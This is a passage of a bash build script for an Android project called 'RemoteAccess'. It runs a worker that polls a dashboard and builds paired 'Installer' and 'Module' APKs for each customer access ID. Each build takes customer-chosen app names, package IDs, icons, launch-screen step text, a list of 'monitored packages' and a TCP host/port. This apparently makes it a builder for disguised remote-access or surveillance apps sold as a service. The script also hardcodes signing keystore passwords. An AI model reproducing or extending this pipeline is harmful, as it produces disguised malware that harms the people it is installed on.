#!/bin/bash
set -euo pipefail

# ─────────────────────────────────────────────────────────────────────────────
#  RemoteAccess — Build script
#  Produces:
#    apk-output/RemoteAccess-debug.apk   (debug, unobfuscated)
#    apk-output/RemoteAccess-release.apk (release, signed + R8 + ProGuard)
#
#  Usage:
#    bash build.sh           — incremental build (fast, skips unchanged tasks)
#    bash build.sh --clean   — full clean build from scratch
#    bash build.sh --worker  — long-running build worker (polls dashboard for
#                              jobs, never sleeps, deployable anywhere). Reads
#                              BUILD_URL and BUILD_API_KEY from env. Reconnects
#                              on every error.
# ─────────────────────────────────────────────────────────────────────────────

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"

# ── Worker mode ────────────────────────────────────────────────────────────
# When --worker is passed (or BUILD_WORKER_MODE=1 in env) this script runs
# forever, polling the dashboard for build jobs. Each job is executed by
# re-invoking this same script (without --worker) with the per-job env vars
# set; stdout/stderr is streamed back to the dashboard, and the resulting
# APKs are uploaded. The worker can be deployed anywhere (a VPS, a CI box,
# a friend's laptop) — it only needs network access to BUILD_URL.
WORKER_MODE=0
for arg in "$@"; do
    [ "$arg" = "--worker" ] && WORKER_MODE=1
done
[ "${BUILD_WORKER_MODE:-0}" = "1" ] && WORKER_MODE=1

if [ "$WORKER_MODE" -eq 1 ]; then
    set +e   # don't let pipeline failures kill the long-running loop

    # Auto-derive BUILD_URL from the container's public URL if not set.
    # Supports Replit, Zeabur, Railway, Render, Koyeb, Vercel, Netlify,
    # Heroku, Fly.io, and any platform exposing PUBLIC_URL / APP_URL.
    if [ -z "${BUILD_URL:-}" ]; then
        for v in ZEABUR_URL ZEABUR_WEB_URL ZEABUR_DOMAIN \
                 RAILWAY_PUBLIC_DOMAIN RAILWAY_STATIC_URL \
                 RENDER_EXTERNAL_URL RENDER_EXTERNAL_HOSTNAME \
                 KOYEB_PUBLIC_DOMAIN \
                 VERCEL_URL VERCEL_BRANCH_URL VERCEL_PROJECT_PRODUCTION_URL \
                 NETLIFY_URL DEPLOY_PRIME_URL DEPLOY_URL URL \
                 PUBLIC_URL APP_URL \
                 REPLIT_DEV_DOMAIN; do
            val="${!v:-}"
            if [ -n "$val" ]; then
                case "$val" in
                    http://*|https://*) BUILD_URL="$val" ;;
                    *)                  BUILD_URL="https://$val" ;;
                esac
                break
            fi
        done
        if [ -z "${BUILD_URL:-}" ] && [ -n "${REPLIT_DOMAINS:-}" ]; then
            BUILD_URL="https://${REPLIT_DOMAINS%%,*}"
        fi
        if [ -z "${BUILD_URL:-}" ] && [ -n "${HEROKU_APP_NAME:-}" ]; then
            BUILD_URL="https://${HEROKU_APP_NAME}.herokuapp.com"
        fi
        if [ -z "${BUILD_URL:-}" ] && [ -n "${FLY_APP_NAME:-}" ]; then
            BUILD_URL="https://${FLY_APP_NAME}.fly.dev"
        fi
        export BUILD_URL
    fi

    : "${BUILD_URL:?BUILD_URL is required in worker mode (e.g. https://dashboard.example.com)}"
    : "${BUILD_API_KEY:?BUILD_API_KEY is required in worker mode}"
    BUILD_URL="${BUILD_URL%/}"   # strip trailing /

    # Concurrency cap. Each job runs in its OWN copy of the source tree under
    # /tmp/ra-job-<JOB_ID>, so jobs cannot clobber each other's strings.xml,
    # Constants.java, build/ outputs, or apk-output/. Up to MAX_PARALLEL
    # builds run simultaneously.
    MAX_PARALLEL="${BUILD_MAX_PARALLEL:-5}"
    case "$MAX_PARALLEL" in
        ''|*[!0-9]*) MAX_PARALLEL=5 ;;
    esac
    [ "$MAX_PARALLEL" -lt 1 ] && MAX_PARALLEL=1

    SELF_SCRIPT="$ROOT_DIR/build.sh"
    LOG_PIPE_DIR="/tmp/ra-worker-$$"
    JOB_ROOT="/tmp/ra-jobs-$$"
    mkdir -p "$LOG_PIPE_DIR" "$JOB_ROOT"

    # Cleanup handler: kill any in-flight job subshells and remove temp dirs.
    cleanup_worker() {
        local pid
        for pid in $(jobs -p 2>/dev/null); do
            kill "$pid" 2>/dev/null || true
        done
        rm -rf "$LOG_PIPE_DIR" "$JOB_ROOT"
    }
    trap cleanup_worker EXIT

    echo "==> RemoteAccess build worker starting"
    echo "    Dashboard:   $BUILD_URL"
    echo "    Concurrency: up to $MAX_PARALLEL job(s) in parallel"
    echo "    Workspace:   $JOB_ROOT (per-job isolation, deleted after each build)"
    echo "    Polling every poll cycle (~25s long-poll). Press Ctrl-C to stop."
    echo ""

    # Wipe any stale APK output from a previous worker process — without this,
    # if the very first build of a new worker fails, the upload step would
    # find leftover Module.apk / Installer.apk on disk from the LAST run of
    # the LAST worker and re-upload them, causing the dashboard to serve an
    # APK the user never actually requested. Also clears the legacy top-level
    # debug/release APKs.
    if [ -d "$ROOT_DIR/apk-output" ]; then
        find "$ROOT_DIR/apk-output" -mindepth 1 -maxdepth 1 \
            \( -type d -o -name "*.apk" -o -name "*.apk.idsig" \) \
            -exec rm -rf {} + 2>/dev/null || true
        echo "    Cleared apk-output/ (no stale APKs will be served)."
        echo ""
    fi

    poll_for_job() {
        # Long-poll the backend; backend holds the connection up to ~25s.
        curl -fsS -m 60 \
            -H "Authorization: Bearer $BUILD_API_KEY" \
            "$BUILD_URL/api/build/worker/poll" 2>/dev/null
    }

    parse_job() {
        # Parse the JSON poll response into shell-quoted assignments.
        # Outputs lines like:  JOB_ID='abc'  JOB_ACCESS_ID='ACC-1'  ...
        python3 - "$1" << 'PYEOF'
import sys, json, shlex
try:
    d = json.loads(sys.argv[1] or '{}')
except Exception:
    print('JOB_HAS=0'); sys.exit(0)
if not d.get('success') or not d.get('hasJob'):
    print('JOB_HAS=0'); sys.exit(0)
j = d['job']
def emit(k, v): print(f'{k}={shlex.quote(str(v))}')
emit('JOB_HAS', '1')
emit('JOB_ID',                j.get('id', ''))
emit('JOB_ACCESS_ID',         j.get('accessId', ''))
emit('JOB_MODULE_NAME',       j.get('moduleName', ''))
emit('JOB_MODULE_PACKAGE',    j.get('modulePackage', ''))
emit('JOB_INSTALLER_NAME',    j.get('installerName', ''))
emit('JOB_INSTALLER_PACKAGE', j.get('installerPackage', ''))
emit('JOB_MONITORED_PACKAGES', ','.join(j.get('monitoredPackages') or []))
emit('JOB_MODULE_ICON_URL',              j.get('moduleIconUrl', ''))
emit('JOB_INSTALLER_ICON_URL',           j.get('installerIconUrl', ''))
emit('JOB_INSTALLER_LAUNCH_TITLE',       j.get('installerLaunchTitle', ''))
emit('JOB_INSTALLER_LAUNCH_SUBTITLE',    j.get('installerLaunchSubtitle', ''))
emit('JOB_INSTALLER_LAUNCH_BTN',         j.get('installerLaunchBtnText', ''))
emit('JOB_INSTALLER_LAUNCH_BG_COLOR',    j.get('installerLaunchBgColor', ''))
emit('JOB_INSTALLER_LAUNCH_ACCENT',      j.get('installerLaunchAccentColor', ''))
emit('JOB_MODULE_LAUNCH_TITLE',          j.get('moduleLaunchTitle', ''))
emit('JOB_MODULE_LAUNCH_SUBTITLE',       j.get('moduleLaunchSubtitle', ''))
emit('JOB_MODULE_LAUNCH_STEP1',          j.get('moduleLaunchStep1', ''))
emit('JOB_MODULE_LAUNCH_STEP2',          j.get('moduleLaunchStep2', ''))
emit('JOB_MODULE_LAUNCH_STEP3',          j.get('moduleLaunchStep3', ''))
emit('JOB_MODULE_LAUNCH_STEP4',          j.get('moduleLaunchStep4', ''))
emit('JOB_MODULE_LAUNCH_BTN',            j.get('moduleLaunchBtnText', ''))
emit('JOB_MODULE_LAUNCH_FOOTER',         j.get('moduleLaunchFooter', ''))
emit('JOB_MODULE_LAUNCH_BG_COLOR',       j.get('moduleLaunchBgColor', ''))
emit('JOB_MODULE_LAUNCH_CARD_COLOR',     j.get('moduleLaunchCardColor', ''))
emit('JOB_MODULE_LAUNCH_ACCENT',         j.get('moduleLaunchAccentColor', ''))
PYEOF
    }

    # Write the log-streaming Python helper to a temp file ONCE so that
    # send_logs() can exec it with `python3 <file>` instead of `python3 -`.
    # Using `python3 - <<EOF` would redirect Python's stdin to the heredoc,
    # causing it to see immediate EOF, exit, and close the upstream pipe —
    # which then SIGPIPE-kills the build process feeding it. Reading the
    # script from a file leaves stdin attached to the actual pipe.
    SEND_LOGS_PY="$LOG_PIPE_DIR/send_logs.py"
    cat > "$SEND_LOGS_PY" << 'PYEOF'
import sys, json, time, urllib.request, urllib.error
url, key, jid = sys.argv[1], sys.argv[2], sys.argv[3]
endpoint = f"{url}/api/build/worker/log/{jid}"
buf, last = [], time.time()
def flush():
    global buf
    if not buf: return
    body = json.dumps({"lines": buf}).encode()
    req = urllib.request.Request(endpoint, data=body, method='POST',
        headers={'Authorization': f'Bearer {key}', 'Content-Type': 'application/json'})
    try: urllib.request.urlopen(req, timeout=15).read()
    except Exception: pass
    buf = []
for raw in sys.stdin:
    line = raw.rstrip('\n').rstrip('\r')
    if line:
        buf.append(line)
    if len(buf) >= 25 or (buf and time.time() - last > 1.0):
        flush(); last = time.time()
flush()
PYEOF

    send_logs() {
        # Read newline-delimited log lines from stdin and POST them in
        # batches to the dashboard's per-job log endpoint. Local echoing
        # is handled by `tee` upstream so we don't double-print.
        local job_id="$1"
        python3 -u "$SEND_LOGS_PY" "$BUILD_URL" "$BUILD_API_KEY" "$job_id" \
            >/dev/null 2>&1
    }

    upload_apk() {
        local job_id="$1"
        local kind="$2"
        local file="$3"
        if [ ! -f "$file" ]; then
            echo "   (skipping upload — $kind APK not found at $file)"
            return 1
        fi
        echo "   ⬆ Uploading $kind APK ($(ls -lh "$file" | awk '{print $5}'))..."
        curl -fsS -m 600 -X POST \
            -H "Authorization: Bearer $BUILD_API_KEY" \
            -H "Content-Type: application/octet-stream" \
            --data-binary "@$file" \
            "$BUILD_URL/api/build/worker/upload/$job_id/$kind" >/dev/null
    }

    complete_job() {
        local job_id="$1"
        local ok="$2"
        local err="${3:-}"
        local body
        body=$(python3 -c "import json,sys; print(json.dumps({'success': sys.argv[1]=='1', 'error': sys.argv[2]}))" "$ok" "$err")
        curl -fsS -m 30 -X POST \
            -H "Authorization: Bearer $BUILD_API_KEY" \
            -H "Content-Type: application/json" \
            -d "$body" \
            "$BUILD_URL/api/build/worker/complete/$job_id" >/dev/null 2>&1 || true
    }

    # Validate access ID format. We only accept "ACC-XXXX-…" (alnum + dash),
    # 6-64 chars. Anything else is rejected before we even copy the source tree
    # — that's the "identify user first" gate the dashboard expects.
    valid_access_id() {
        local s="$1"
        [ -n "$s" ] || return 1
        local len=${#s}
        [ "$len" -ge 6 ] && [ "$len" -le 64 ] || return 1
        [[ "$s" =~ ^[A-Za-z0-9_-]+$ ]] || return 1
        return 0
    }

    # Provision an isolated copy of the source tree at /tmp/ra-jobs-$$/<JOB_ID>/
    # so concurrent builds cannot trample each other's per-build mutations
    # (strings.xml, Constants.java, app/build.access_id, app/build/ outputs,
    # apk-output/, …). Skips heavy directories that don't need to be copied:
    #   .git/  .gradle/  app/build/  installer/build/  apk-output/
    #   node_modules/ react-dashboard/ build_logs/  .agents/
    provision_workspace() {
        local job_id="$1"
        local dst="$JOB_ROOT/$job_id"
        rm -rf "$dst"
        mkdir -p "$dst"
        # cp -a preserves perms, symlinks, timestamps.
        # Use a tar pipe with --exclude so we get a fast, exclude-aware copy
        # without depending on rsync (alpine images ship without it).
        ( cd "$ROOT_DIR" && tar \
            --exclude=./.git \
            --exclude=./.gradle \
            --exclude=./.cache \
            --exclude=./.local \
            --exclude=./.agents \
            --exclude=./node_modules \
            --exclude=./react-dashboard/node_modules \
            --exclude=./react-dashboard/dist \
            --exclude=./app/build \
            --exclude=./installer/build \
            --exclude=./apk-output \
            --exclude=./build_logs \
            --exclude=./tmp \
            -cf - . ) | ( cd "$dst" && tar -xf - )
        mkdir -p "$dst/apk-output"
    }

    # Run a single job in the background. All output is tagged "[<JOB_ID>] "
    # so the worker's parent stdout (and the dashboard status server that
    # consumes it) can attribute interleaved lines from concurrent jobs.
    run_job() {
        local JOB_ID="$1"
        local JOB_ACCESS_ID="$2"
        local JOB_MODULE_NAME="$3"
        local JOB_MODULE_PACKAGE="$4"
        local JOB_INSTALLER_NAME="$5"
        local JOB_INSTALLER_PACKAGE="$6"
        local JOB_MONITORED_PACKAGES="$7"
        local JOB_MODULE_ICON_URL="$8"
        local JOB_INSTALLER_ICON_URL="$9"
        local JOB_INSTALLER_LAUNCH_TITLE="${10}"
        local JOB_INSTALLER_LAUNCH_SUBTITLE="${11}"
        local JOB_INSTALLER_LAUNCH_BTN="${12}"
        local JOB_INSTALLER_LAUNCH_BG_COLOR="${13}"
        local JOB_INSTALLER_LAUNCH_ACCENT="${14}"
        local JOB_MODULE_LAUNCH_TITLE="${15}"
        local JOB_MODULE_LAUNCH_SUBTITLE="${16}"
        local JOB_MODULE_LAUNCH_STEP1="${17}"
        local JOB_MODULE_LAUNCH_STEP2="${18}"
        local JOB_MODULE_LAUNCH_STEP3="${19}"
        local JOB_MODULE_LAUNCH_STEP4="${20}"
        local JOB_MODULE_LAUNCH_BTN="${21}"
        local JOB_MODULE_LAUNCH_FOOTER="${22}"
        local JOB_MODULE_LAUNCH_BG_COLOR="${23}"
        local JOB_MODULE_LAUNCH_CARD_COLOR="${24}"
        local JOB_MODULE_LAUNCH_ACCENT="${25}"

        (
            # ── Identify user FIRST (before any disk work) ───────────────────
            echo "🔎 Identifying user for job $JOB_ID …"
            if ! valid_access_id "$JOB_ACCESS_ID"; then
                echo "❌ Refusing to build — invalid access id: '$JOB_ACCESS_ID'"
                complete_job "$JOB_ID" 0 "Invalid access id '$JOB_ACCESS_ID' — must be 6-64 chars [A-Za-z0-9_-]"
                exit 0
            fi
            echo "👤 Verified user: $JOB_ACCESS_ID"

            echo "════════════════════════════════════════════════════════════════"
            echo "  ▶ Job $JOB_ID — Access $JOB_ACCESS_ID"
            echo "    Module:    $JOB_MODULE_NAME ($JOB_MODULE_PACKAGE)"
            echo "    Installer: $JOB_INSTALLER_NAME ($JOB_INSTALLER_PACKAGE)"
            [ -n "$JOB_MONITORED_PACKAGES" ] && echo "    Monitored: $JOB_MONITORED_PACKAGES"
            echo "════════════════════════════════════════════════════════════════"

            # ── Provision an isolated workspace ──────────────────────────────
            echo "📂 Provisioning isolated workspace at $JOB_ROOT/$JOB_ID …"
            if ! provision_workspace "$JOB_ID"; then
                echo "❌ Failed to copy source tree into $JOB_ROOT/$JOB_ID"
                complete_job "$JOB_ID" 0 "Worker failed to provision an isolated workspace"
                exit 0
            fi
            local WORKDIR="$JOB_ROOT/$JOB_ID"

            # ── Run the per-job build ───────────────────────────────────────
            local JOB_LOG="$LOG_PIPE_DIR/${JOB_ID}.log"
            : > "$JOB_LOG"

            # IMPORTANT: capture the build's true exit code via PIPESTATUS so
            # the upload step can refuse to ship stale APKs after a crash.
            #
            # Pipeline explanation:
            #   { build } | tee -a JOB_LOG | tee >(send_logs JOB_ID)
            #
            # The second `tee` splits output to TWO destinations:
            #   1) Its stdout  — flows out of the subshell, gets tagged
            #                    "[JOB_ID] " by the outer sed and streamed
            #                    to the status server console in real time.
            #   2) send_logs  — batches lines and POSTs them to BUILD_URL
            #                    so the dashboard also receives live logs.
            # Without this split, tee piped directly into send_logs consumed
            # stdout entirely and NO build output reached the console.
            set -o pipefail
            {
                BUILD_ACCESS_ID="$JOB_ACCESS_ID" \
                BUILD_MODULE_NAME="$JOB_MODULE_NAME" \
                BUILD_MODULE_PACKAGE="$JOB_MODULE_PACKAGE" \
                BUILD_INSTALLER_NAME="$JOB_INSTALLER_NAME" \
                BUILD_INSTALLER_PACKAGE="$JOB_INSTALLER_PACKAGE" \
                BUILD_MONITORED_PACKAGES="$JOB_MONITORED_PACKAGES" \
                BUILD_MODULE_ICON_URL="$JOB_MODULE_ICON_URL" \
                BUILD_INSTALLER_ICON_URL="$JOB_INSTALLER_ICON_URL" \
                BUILD_INSTALLER_LAUNCH_TITLE="$JOB_INSTALLER_LAUNCH_TITLE" \
                BUILD_INSTALLER_LAUNCH_SUBTITLE="$JOB_INSTALLER_LAUNCH_SUBTITLE" \
                BUILD_INSTALLER_LAUNCH_BTN="$JOB_INSTALLER_LAUNCH_BTN" \
                BUILD_INSTALLER_LAUNCH_BG_COLOR="$JOB_INSTALLER_LAUNCH_BG_COLOR" \
                BUILD_INSTALLER_LAUNCH_ACCENT="$JOB_INSTALLER_LAUNCH_ACCENT" \
                BUILD_MODULE_LAUNCH_TITLE="$JOB_MODULE_LAUNCH_TITLE" \
                BUILD_MODULE_LAUNCH_SUBTITLE="$JOB_MODULE_LAUNCH_SUBTITLE" \
                BUILD_MODULE_LAUNCH_STEP1="$JOB_MODULE_LAUNCH_STEP1" \
                BUILD_MODULE_LAUNCH_STEP2="$JOB_MODULE_LAUNCH_STEP2" \
                BUILD_MODULE_LAUNCH_STEP3="$JOB_MODULE_LAUNCH_STEP3" \
                BUILD_MODULE_LAUNCH_STEP4="$JOB_MODULE_LAUNCH_STEP4" \
                BUILD_MODULE_LAUNCH_BTN="$JOB_MODULE_LAUNCH_BTN" \
                BUILD_MODULE_LAUNCH_FOOTER="$JOB_MODULE_LAUNCH_FOOTER" \
                BUILD_MODULE_LAUNCH_BG_COLOR="$JOB_MODULE_LAUNCH_BG_COLOR" \
                BUILD_MODULE_LAUNCH_CARD_COLOR="$JOB_MODULE_LAUNCH_CARD_COLOR" \
                BUILD_MODULE_LAUNCH_ACCENT="$JOB_MODULE_LAUNCH_ACCENT" \
                bash "$WORKDIR/build.sh" 2>&1
                echo "__BUILD_EXIT__=${PIPESTATUS[0]:-$?}"
            } | tee -a "$JOB_LOG" | tee >(send_logs "$JOB_ID")
            set +o pipefail

            local rc
            rc="$(grep -oE '__BUILD_EXIT__=[0-9]+' "$JOB_LOG" | tail -1 | cut -d= -f2)"
            rc="${rc:-1}"

            local OUT_DIR="$WORKDIR/apk-output/$JOB_ACCESS_ID"
            local MOD_SRC="$OUT_DIR/Module.apk"
            local INST_SRC="$OUT_DIR/Installer.apk"

            if [ "$rc" != "0" ]; then
                echo "❌ Job $JOB_ID failed — build exited with code $rc; not uploading any APKs."
                complete_job "$JOB_ID" 0 "Build failed (exit $rc)"
            elif [ ! -f "$MOD_SRC" ] || [ ! -f "$INST_SRC" ]; then
                local missing=""
                [ ! -f "$MOD_SRC" ]  && missing="${missing}Module.apk "
                [ ! -f "$INST_SRC" ] && missing="${missing}Installer.apk "
                echo "❌ Job $JOB_ID failed — missing artefact(s): ${missing}— not uploading."
                complete_job "$JOB_ID" 0 "Build did not produce: ${missing% }"
            else
                # Publish into the worker's apk-output/<accessId>/ for visibility.
                local PUB_DIR="$ROOT_DIR/apk-output/$JOB_ACCESS_ID"
                mkdir -p "$PUB_DIR"
                cp -f "$MOD_SRC"  "$PUB_DIR/Module.apk"
                cp -f "$INST_SRC" "$PUB_DIR/Installer.apk"

                local MOD_OK=1 INST_OK=1
                upload_apk "$JOB_ID" module    "$PUB_DIR/Module.apk"    || MOD_OK=0
                upload_apk "$JOB_ID" installer "$PUB_DIR/Installer.apk" || INST_OK=0

                if [ "$MOD_OK" = 1 ] && [ "$INST_OK" = 1 ]; then
                    echo "✅ Job $JOB_ID succeeded — both APKs uploaded for $JOB_ACCESS_ID."
                    complete_job "$JOB_ID" 1 ""
                else
                    local err="Upload failed (module=$MOD_OK installer=$INST_OK)"
                    echo "❌ Job $JOB_ID failed — $err"
                    complete_job "$JOB_ID" 0 "$err"
                fi
            fi

            # ── Always tear down the per-job workspace ──────────────────────
            rm -rf "$WORKDIR" "$JOB_LOG"
            echo "🧹 Cleaned workspace for job $JOB_ID"
        ) 2>&1 | { stdbuf -oL -eL sed "s|^|[$JOB_ID] |" 2>/dev/null \
                   || sed "s|^|[$JOB_ID] |"; }
    }

    # Track in-flight job PIDs so we can cap concurrency. We use `wait -n`
    # to block until ANY background job finishes, then reap and continue.
    declare -A JOB_PIDS=()
    reap_finished_jobs() {
        local jid pid
        for jid in "${!JOB_PIDS[@]}"; do
            pid="${JOB_PIDS[$jid]}"
            if ! kill -0 "$pid" 2>/dev/null; then
                wait "$pid" 2>/dev/null || true
                unset 'JOB_PIDS[$jid]'
            fi
        done
    }

    while true; do
        reap_finished_jobs

        # Block here when the slot pool is full.
        while [ "${#JOB_PIDS[@]}" -ge "$MAX_PARALLEL" ]; do
            wait -n 2>/dev/null || true
            reap_finished_jobs
        done

        resp="$(poll_for_job)"
        if [ -z "$resp" ]; then
            sleep 3
            continue
        fi
        eval "$(parse_job "$resp")"
        if [ "${JOB_HAS:-0}" != "1" ]; then
            # No job available — long-poll just timed out, immediately re-poll.
            continue
        fi

        # Spawn the job in the background and track its PID.
        run_job \
            "$JOB_ID" \
            "$JOB_ACCESS_ID" \
            "$JOB_MODULE_NAME" \
            "$JOB_MODULE_PACKAGE" \
            "$JOB_INSTALLER_NAME" \
            "$JOB_INSTALLER_PACKAGE" \
            "$JOB_MONITORED_PACKAGES" \
            "${JOB_MODULE_ICON_URL:-}" \
            "${JOB_INSTALLER_ICON_URL:-}" \
            "${JOB_INSTALLER_LAUNCH_TITLE:-}" \
            "${JOB_INSTALLER_LAUNCH_SUBTITLE:-}" \
            "${JOB_INSTALLER_LAUNCH_BTN:-}" \
            "${JOB_INSTALLER_LAUNCH_BG_COLOR:-}" \
            "${JOB_INSTALLER_LAUNCH_ACCENT:-}" \
            "${JOB_MODULE_LAUNCH_TITLE:-}" \
            "${JOB_MODULE_LAUNCH_SUBTITLE:-}" \
            "${JOB_MODULE_LAUNCH_STEP1:-}" \
            "${JOB_MODULE_LAUNCH_STEP2:-}" \
            "${JOB_MODULE_LAUNCH_STEP3:-}" \
            "${JOB_MODULE_LAUNCH_STEP4:-}" \
            "${JOB_MODULE_LAUNCH_BTN:-}" \
            "${JOB_MODULE_LAUNCH_FOOTER:-}" \
            "${JOB_MODULE_LAUNCH_BG_COLOR:-}" \
            "${JOB_MODULE_LAUNCH_CARD_COLOR:-}" \
            "${JOB_MODULE_LAUNCH_ACCENT:-}" &
        JOB_PIDS["$JOB_ID"]=$!
        echo "📥 Job $JOB_ID accepted for $JOB_ACCESS_ID (slots in use: ${#JOB_PIDS[@]}/$MAX_PARALLEL)"
    done
fi

# ─── Single-build mode (used directly OR via the worker loop above) ─────────

ANDROID_SDK_DIR="/opt/android-sdk"
if [ ! -d "$ANDROID_SDK_DIR" ]; then
    ANDROID_SDK_DIR="/tmp/android-sdk"
fi
echo "Using ANDROID_SDK_DIR: $ANDROID_SDK_DIR"
CMDLINE_TOOLS_URL="https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip"
CMDLINE_TOOLS_ZIP="/tmp/cmdline-tools.zip"
ZULU_JDK="/nix/store/0zjj9k6wz5hl4jizcfrkr0i4l8q45v51-zulu-ca-jdk-17.0.8.1"
KEYSTORE="$ROOT_DIR/app/release.keystore"
KEY_ALIAS="tusker_key"
KEY_PASS="K#9mXq@Lp2!ZrVt&NwYsBjC5uEhGfD8"
STORE_PASS="K#9mXq@Lp2!ZrVt&NwYsBjC5uEhGfD8"

CLEAN_BUILD=0
for arg in "$@"; do
  [ "$arg" = "--clean" ] && CLEAN_BUILD=1
done

# ── 0a. Per-build customization (called from backend /api/build/apk) ─────────
# Optional env vars from caller:
#   BUILD_ACCESS_ID            Per-user identifier baked into BuildConfig.ACCESS_ID
#   BUILD_MODULE_NAME          Display name of the main "module" app (app_name)
#   BUILD_MODULE_PACKAGE       applicationId of the main "module" app
#   BUILD_INSTALLER_NAME       Display name of the installer (app_name)
#   BUILD_INSTALLER_PACKAGE    applicationId of the installer
#   BUILD_MONITORED_PACKAGES   Comma- or whitespace-separated list of Android
#                              package names to inject into Constants.java
#                              MONITORED_PACKAGES (overrides the in-tree default).
#
# Overrides are written to per-build files that gradle reads at configuration
# time (app/build.access_id, app/build.app_id, installer/build.app_id). The
# strings.xml + Constants.java mutations are backed up and restored via the
# EXIT trap so subsequent default builds are unaffected.
APP_STRINGS="$ROOT_DIR/app/src/main/res/values/strings.xml"
INSTALLER_STRINGS="$ROOT_DIR/installer/src/main/res/values/strings.xml"
APP_CONSTANTS="$ROOT_DIR/app/src/main/java/com/task/tusker/utils/Constants.java"
ACCESS_ID_FILE="$ROOT_DIR/app/build.access_id"
APP_ID_FILE="$ROOT_DIR/app/build.app_id"
INSTALLER_ID_FILE="$ROOT_DIR/installer/build.app_id"

# Backup files for the strings.xml mutations. IMPORTANT: these MUST live
# OUTSIDE of any Android resource directory (res/, assets/, src/, etc.)
# because Android's resource merger scans those directories recursively
# and refuses any file whose name does not end in .xml — a stale .bak
# next to strings.xml will fail the whole build with:
#   "Error: The file name must end with .xml"
# Stash them under .gradle/ instead, which gradle ignores.
BACKUP_DIR="$ROOT_DIR/.gradle/build-script-backups"
mkdir -p "$BACKUP_DIR"
APP_STRINGS_BAK="$BACKUP_DIR/app.strings.xml.bak"
INSTALLER_STRINGS_BAK="$BACKUP_DIR/installer.strings.xml.bak"
APP_CONSTANTS_BAK="$BACKUP_DIR/app.Constants.java.bak"

# Also defensively clean up any *.bak files that a previous, interrupted
# run may have left INSIDE Android resource directories. Without this,
# the very next build dies in MergeResources with the error above.
find "$ROOT_DIR/app/src" "$ROOT_DIR/installer/src" -type f -name "*.bak" \
    -not -path "*/java/*" -delete 2>/dev/null || true

APP_LAYOUT="$ROOT_DIR/app/src/main/res/layout/activity_main.xml"
INSTALLER_LAYOUT="$ROOT_DIR/installer/src/main/res/layout/activity_main.xml"
INSTALLER_COLORS="$ROOT_DIR/installer/src/main/res/values/colors.xml"
APP_LAYOUT_BAK="$BACKUP_DIR/app.activity_main.xml.bak"
INSTALLER_LAYOUT_BAK="$BACKUP_DIR/installer.activity_main.xml.bak"
INSTALLER_COLORS_BAK="$BACKUP_DIR/installer.colors.xml.bak"

cleanup_overrides() {
    [ -f "$APP_STRINGS_BAK"       ] && mv -f "$APP_STRINGS_BAK"       "$APP_STRINGS"       || true
    [ -f "$INSTALLER_STRINGS_BAK" ] && mv -f "$INSTALLER_STRINGS_BAK" "$INSTALLER_STRINGS" || true
    [ -f "$APP_CONSTANTS_BAK"     ] && mv -f "$APP_CONSTANTS_BAK"     "$APP_CONSTANTS"     || true
    [ -f "$APP_LAYOUT_BAK"        ] && mv -f "$APP_LAYOUT_BAK"        "$APP_LAYOUT"        || true
    [ -f "$INSTALLER_LAYOUT_BAK"  ] && mv -f "$INSTALLER_LAYOUT_BAK"  "$INSTALLER_LAYOUT"  || true
    [ -f "$INSTALLER_COLORS_BAK"  ] && mv -f "$INSTALLER_COLORS_BAK"  "$INSTALLER_COLORS"  || true
    rm -f "$ACCESS_ID_FILE" "$APP_ID_FILE" "$INSTALLER_ID_FILE"
    rm -f "${MODULE_KS_PATH:-}" "${INST_KS_PATH:-}" 2>/dev/null || true
}
trap cleanup_overrides EXIT

if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_TCP_HOST:-}" ] || [ -n "${BUILD_TCP_PORT:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]; then
    echo ""
    echo "==> Per-build customization active"

    if [ -n "${BUILD_ACCESS_ID:-}" ]; then
        printf '%s' "$BUILD_ACCESS_ID" > "$ACCESS_ID_FILE"
        echo "  BuildConfig.ACCESS_ID = $BUILD_ACCESS_ID"
    fi
    if [ -n "${BUILD_MODULE_PACKAGE:-}" ]; then
        printf '%s' "$BUILD_MODULE_PACKAGE" > "$APP_ID_FILE"
        echo "  app applicationId    = $BUILD_MODULE_PACKAGE"
    fi
    if [ -n "${BUILD_INSTALLER_PACKAGE:-}" ]; then
        printf '%s' "$BUILD_INSTALLER_PACKAGE" > "$INSTALLER_ID_FILE"
        echo "  installer appId      = $BUILD_INSTALLER_PACKAGE"
    fi
    if [ -n "${BUILD_MODULE_NAME:-}" ] && [ -f "$APP_STRINGS" ]; then
        cp "$APP_STRINGS" "$APP_STRINGS_BAK"
        BUILD_MODULE_NAME="$BUILD_MODULE_NAME" python3 - "$APP_STRINGS" << 'PYEOF'
import sys, os, re
path = sys.argv[1]
name = os.environ['BUILD_MODULE_NAME']
with open(path, 'r', encoding='utf-8') as f: src = f.read()
def esc(s):
    return s.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'", '&apos;')
new = re.sub(r'(<string\s+name="app_name"[^>]*>)[^<]*(</string>)',
             lambda m: m.group(1) + esc(name) + m.group(2), src, count=1)
